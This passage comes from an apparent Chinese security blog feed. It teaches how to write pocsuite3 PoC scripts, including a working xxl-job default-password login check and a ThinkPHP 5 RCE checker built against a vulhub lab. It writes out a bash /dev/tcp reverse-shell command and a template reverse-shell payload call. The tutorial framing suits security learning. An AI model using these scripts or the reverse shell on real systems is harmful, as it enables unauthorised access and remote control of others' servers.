class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\software\python3\Lib\site-packages\pocsuite3\pocs\demo_poc.py</span><br></pre></td></tr></table></figure><p>pycharm分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> (</span><br><span class="line">    Output,</span><br><span class="line">    POCBase,</span><br><span class="line">    POC_CATEGORY,</span><br><span class="line">    register_poc,</span><br><span class="line">    requests,</span><br><span class="line">    VUL_TYPE,</span><br><span class="line">    get_listener_ip,</span><br><span class="line">    get_listener_port,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> pocsuite3.lib.core.interpreter_option <span class="keyword">import</span> (</span><br><span class="line">    OptString,</span><br><span class="line">    OptDict,</span><br><span class="line">    OptIP,</span><br><span class="line">    OptPort,</span><br><span class="line">    OptBool,</span><br><span class="line">    OptInteger,</span><br><span class="line">    OptFloat,</span><br><span class="line">    OptItems,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> pocsuite3.modules.listener <span class="keyword">import</span> REVERSE_PAYLOAD</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以上就是各种导入模块而已 , 有的用了 , 有的灰色的就是没有使用模块中的内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DemoPOC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&quot;1571&quot;</span>  <span class="comment"># ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span></span><br><span class="line">    version = <span class="string">&quot;1&quot;</span>  <span class="comment"># 默认为1</span></span><br><span class="line">    author = <span class="string">&quot;seebug&quot;</span>  <span class="comment"># PoC作者的大名</span></span><br><span class="line">    vulDate = <span class="string">&quot;2014-10-16&quot;</span>  <span class="comment"># 漏洞公开的时间,不知道就写今天</span></span><br><span class="line">    createDate = <span class="string">&quot;2014-10-16&quot;</span>  <span class="comment"># 编写 PoC 的日期</span></span><br><span class="line">    updateDate = <span class="string">&quot;2014-10-16&quot;</span>  <span class="comment"># PoC 更新的时间,默认和编写时间一样</span></span><br><span class="line">    references = [<span class="string">&quot;https://xxx.xx.com.cn&quot;</span>]  <span class="comment"># 漏洞地址来源,0day不用写</span></span><br><span class="line">    name = <span class="string">&quot;XXXX SQL注入漏洞 PoC&quot;</span>  <span class="comment"># PoC 名称</span></span><br><span class="line">    appPowerLink = <span class="string">&quot;https://www.drupal.org/&quot;</span>  <span class="comment"># 漏洞厂商主页地址</span></span><br><span class="line">    appName = <span class="string">&quot;Drupal&quot;</span>  <span class="comment"># 漏洞应用名称</span></span><br><span class="line">    appVersion = <span class="string">&quot;7.x&quot;</span>  <span class="comment"># 漏洞影响版本</span></span><br><span class="line">    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS  <span class="comment"># 漏洞类型,类型参考见 漏洞类型规范表</span></span><br><span class="line">    category = POC_CATEGORY.EXPLOITS.WEBAPP</span><br><span class="line">    samples = []  <span class="comment"># 测试样列,就是用 PoC 测试成功的网站</span></span><br><span class="line">    install_requires = []  <span class="comment"># PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span></span><br><span class="line">    desc = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Drupal 在处理 IN 语句时，展开数组时 key 带入 SQL 语句导致 SQL 注入，</span></span><br><span class="line"><span class="string">            可以添加管理员、造成信息泄露。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>  <span class="comment"># 漏洞简要描述</span></span><br><span class="line">    pocDesc = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            poc的用法描述</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>  <span class="comment"># POC用法描述</span></span><br><span class="line">    <span class="comment"># 各种变量的定义 , 关于poc的描述</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_options</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;如果poc需要登录,这个是登录函数模板&quot;&quot;&quot;</span></span><br><span class="line">        opt = OrderedDict()  <span class="comment"># value = self.get_option(&#x27;key&#x27;)</span></span><br><span class="line">        opt[<span class="string">&quot;string&quot;</span>] = OptString(<span class="string">&quot;&quot;</span>, description=<span class="string">&quot;这个poc需要用户登录，请输入登录账号&quot;</span>, require=<span class="literal">True</span>)</span><br><span class="line">        opt[<span class="string">&quot;integer&quot;</span>] = OptInteger(</span><br><span class="line">            <span class="string">&quot;&quot;</span>, description=<span class="string">&quot;这个poc需要用户密码，请输出用户密码&quot;</span>, require=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> opt</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 重点是这个验证代码</span></span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="comment"># 验证代码</span></span><br><span class="line">        result = &#123;</span><br><span class="line">            <span class="comment"># 不管是验证模式或者攻击模式，返回结果 result 中的 key 值必须按照下面的规范来写</span></span><br><span class="line">            <span class="comment"># [ PoC结果返回规范 ]( https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md#resultstandard )</span></span><br><span class="line">            <span class="string">&quot;Result&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;DBInfo&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;Username&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Salt&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Uid&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Groupid&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;ShellInfo&quot;</span>: &#123;<span class="string">&quot;URL&quot;</span>: <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Content&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;,</span><br><span class="line">                <span class="string">&quot;FileInfo&quot;</span>: &#123;<span class="string">&quot;Filename&quot;</span>: <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Content&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;,</span><br><span class="line">                <span class="string">&quot;XSSInfo&quot;</span>: &#123;<span class="string">&quot;URL&quot;</span>: <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Payload&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;,</span><br><span class="line">                <span class="string">&quot;AdminInfo&quot;</span>: &#123;<span class="string">&quot;Uid&quot;</span>: <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Username&quot;</span>: <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;,</span><br><span class="line">                <span class="string">&quot;Database&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;Hostname&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Username&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;DBname&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;VerifyInfo&quot;</span>: &#123;<span class="string">&quot;URL&quot;</span>: <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Postdata&quot;</span>: <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Path&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;,</span><br><span class="line">                <span class="string">&quot;SiteAttr&quot;</span>: &#123;<span class="string">&quot;Process&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;,</span><br><span class="line">                <span class="string">&quot;Stdout&quot;</span>: <span class="string">&quot;result output string&quot;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> result:  <span class="comment"># result是返回结果</span></span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&quot;target is not vulnerable&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        <span class="comment"># 攻击代码</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_shell</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        shell模式下，只能运行单个PoC脚本，控制台会进入shell交互模式执行命令及输出</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        cmd = REVERSE_PAYLOAD.BASH.<span class="built_in">format</span>(get_listener_ip(), get_listener_port())</span><br><span class="line">        <span class="comment"># 攻击代码 execute cmd</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">other_fuc</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">other_utils_func</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册 DemoPOC 类</span></span><br><span class="line">register_poc(DemoPOC)</span><br></pre></td></tr></table></figure><p>直接 , 修改<code>xxl-job</code>的默认弱口令为pocsuite3 poc版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> (</span><br><span class="line">    Output,</span><br><span class="line">    POCBase,</span><br><span class="line">    POC_CATEGORY,</span><br><span class="line">    register_poc,</span><br><span class="line">    requests,</span><br><span class="line">    VUL_TYPE,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关于类的继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XXLJOBPOC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    <span class="comment"># fofa语句: title=&quot;任务调度中心&quot;</span></span><br><span class="line">    vulID = <span class="string">&quot;0&quot;</span>  <span class="comment"># ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span></span><br><span class="line">    version = <span class="string">&quot;1&quot;</span>  <span class="comment"># 默认为1</span></span><br><span class="line">    author = <span class="string">&quot;derian&quot;</span>  <span class="comment"># PoC作者的大名</span></span><br><span class="line">    vulDate = <span class="string">&quot;2021-11-11&quot;</span>  <span class="comment"># 漏洞公开的时间,不知道就写今天</span></span><br><span class="line">    createDate = <span class="string">&quot;2021-11-11&quot;</span>  <span class="comment"># 编写 PoC 的日期</span></span><br><span class="line">    updateDate = <span class="string">&quot;2021-11-11&quot;</span>  <span class="comment"># PoC 更新的时间,默认和编写时间一样</span></span><br><span class="line">    references = [<span class="string">&quot;https://github.com/xuxueli/xxl-job&quot;</span>]  <span class="comment"># 漏洞地址来源,0day不用写</span></span><br><span class="line">    name = <span class="string">&quot;xxl-job 后台存在弱口令漏洞 PoC&quot;</span>  <span class="comment"># PoC 名称</span></span><br><span class="line">    appPowerLink = <span class="string">&quot;https://github.com/xuxueli/xxl-job&quot;</span>  <span class="comment"># 漏洞厂商主页地址</span></span><br><span class="line">    appName = <span class="string">&quot;xxl-job&quot;</span>  <span class="comment"># 漏洞应用名称</span></span><br><span class="line">    appVersion = <span class="string">&quot;all&quot;</span>  <span class="comment"># 漏洞影响版本</span></span><br><span class="line">    vulType = VUL_TYPE.WEAK_PASSWORD  <span class="comment"># 弱口令 漏洞类型,类型参考见 漏洞类型规范表</span></span><br><span class="line">    category = POC_CATEGORY.EXPLOITS.WEBAPP  <span class="comment"># poc对应的产品类型 web的</span></span><br><span class="line">    <span class="comment"># samples = []  # 测试样列,就是用 PoC 测试成功的网站</span></span><br><span class="line">    <span class="comment"># install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span></span><br><span class="line">    desc = <span class="string">&quot;&quot;&quot;xxl-job后台管理存在弱口令,导致任意用户可以轻易爆破出来登录后台,通过后台的功能点远程代码执行。&quot;&quot;&quot;</span>  <span class="comment"># 漏洞简要描述</span></span><br><span class="line">    pocDesc = <span class="string">&quot;&quot;&quot;直接登录即可&quot;&quot;&quot;</span>  <span class="comment"># POC用法描述</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_check</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 漏洞验证代码</span></span><br><span class="line">        headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1&quot;</span>&#125;</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;userName&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        result = []</span><br><span class="line">        <span class="comment"># 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = self.url.strip() + <span class="string">&quot;/login&quot;</span>  <span class="comment"># self.url 就是你指定的-u 参数的值</span></span><br><span class="line">            res = requests.post(url=url, headers=headers, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">9</span>)</span><br><span class="line">            data_dict = res.json()</span><br><span class="line">            <span class="comment"># 判断是否存在漏洞</span></span><br><span class="line">            <span class="keyword">if</span> data_dict.get(<span class="string">&quot;code&quot;</span>) == <span class="number">200</span> <span class="keyword">and</span> data_dict.get(<span class="string">&quot;msg&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">                result.append(url)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="comment"># 跟 try ... except是一对的 , 最终一定会执行里面的代码 , 不管你是否报错</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 验证模式 , 调用检查代码 ,</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        res = self._check()  <span class="comment"># res就是返回的结果列表</span></span><br><span class="line">        <span class="keyword">if</span> res:</span><br><span class="line">            result[<span class="string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;</span><br><span class="line">            result[<span class="string">&#x27;VerifyInfo&#x27;</span>][<span class="string">&#x27;Info&#x27;</span>] = self.name</span><br><span class="line">            result[<span class="string">&#x27;VerifyInfo&#x27;</span>][<span class="string">&#x27;vul_url&#x27;</span>] = self.url</span><br><span class="line">            result[<span class="string">&#x27;VerifyInfo&#x27;</span>][<span class="string">&#x27;vul_detail&#x27;</span>] = self.desc</span><br><span class="line">        <span class="keyword">return</span> self.parse_verify(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 攻击模式 , 就是在调用验证模式</span></span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_verify</span>(<span class="params">self, result</span>):</span><br><span class="line">        <span class="comment"># 解析认证 , 输出</span></span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="comment"># 根据result的bool值判断是否有漏洞</span></span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;Target is not vulnerable&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你会发现没有shell模式 , 对吧 ,根本就用不到</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他自定义的可添加的功能函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">other_fuc</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他工具函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">other_utils_func</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册 DemoPOC 类 , 必须要注册</span></span><br><span class="line">register_poc(XXLJOBPOC)</span><br></pre></td></tr></table></figure><p>掌握通过模板自己能够边写出来对应的poc脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">基本上只需修改 def check()里的内容</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>poc和exp的编写</title>
      <link href="/2023/04/02/poc&amp;exp%E7%BC%96%E5%86%99/"/>
      <url>/2023/04/02/poc&amp;exp%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="1-poc和exp的区别"><a href="#1-poc和exp的区别" class="headerlink" title="1.poc和exp的区别"></a>1.poc和exp的区别</h2><p>poc</p><ul><li>漏洞验证</li></ul><p>exp</p><ul><li>漏洞利用</li></ul><p>他们两个的本质区别是使用的 <strong><code>payload</code></strong> 不同 , 比如我一个远程命令执行的漏洞 , 当我的payload是 id&#x2F;whoami这样的命令时 , 那么我整个脚本或者工具 , 就是poc , 因为我只是让他执行一下简单的系统命令来判断目标是否存在这样的漏洞 , 如果我的payload是一串 反弹shell的系统命令 </p><p>如 <code>/bin/bash -i &gt;&amp; /dev/tcp/192.168.101.48/5656 0&gt;&amp;1</code> , 那么我整个工具就是一个exp , 可能这个poc和exp其他的代码都一模一样 , 只有要执行的命令 , 也就是这个命令 , 即 payload 不同 , 决定了这个脚本是poc还是exp</p><h2 id="2-编写thinkphp5-rce的poc"><a href="#2-编写thinkphp5-rce的poc" class="headerlink" title="2.编写thinkphp5 rce的poc"></a>2.编写thinkphp5 rce的poc</h2><p>环境自己使用vulhub搭建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/thinkphp/5.0.23-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>使用 argparse 模块接收用户参数 , 加上banner信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">url, func=<span class="string">&quot;phpinfo&quot;</span></span>):</span><br><span class="line">    <span class="comment"># 1.发请求</span></span><br><span class="line">    full_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/index.php?s=captcha&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://192.168.0.60:8080&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.0.60:8080/index.php?s=captcha&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,ja;q=0.8&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;_method&quot;</span>: <span class="string">&quot;__construct&quot;</span>, <span class="string">&quot;filter[]&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;func&#125;</span>&quot;</span>, <span class="string">&quot;method&quot;</span>: <span class="string">&quot;get&quot;</span>, <span class="string">&quot;server[REQUEST_METHOD]&quot;</span>: <span class="string">&quot;-1&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(full_url, headers=headers, data=data,verify=<span class="literal">False</span>, timeout=<span class="number">5</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;url&#125;</span> 请求失败&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 2.判断是否存在漏洞</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;PHP Extension Build&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+]<span class="subst">&#123;url&#125;</span> 存在远程代码执行漏洞&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;url&#125;</span> 不存在远程代码执行漏洞&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string"> _   _     _       _          _          ____                 </span></span><br><span class="line"><span class="string">| |_| |__ (_)_ __ | | ___ __ | |__  _ __| ___|   _ __ ___ ___ </span></span><br><span class="line"><span class="string">| __| &#x27;_ \| | &#x27;_ \| |/ / &#x27;_ \| &#x27;_ \| &#x27;_ \___ \  | &#x27;__/ __/ _ \\</span></span><br><span class="line"><span class="string">| |_| | | | | | | |   &lt;| |_) | | | | |_) |__) | | | | (_|  __/</span></span><br><span class="line"><span class="string"> \__|_| |_|_|_| |_|_|\_\ .__/|_| |_| .__/____/  |_|  \___\___|</span></span><br><span class="line"><span class="string">                       |_|         |_|  </span></span><br><span class="line"><span class="string">                                                version: 0.0.1</span></span><br><span class="line"><span class="string">                                                author:   mhx</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span 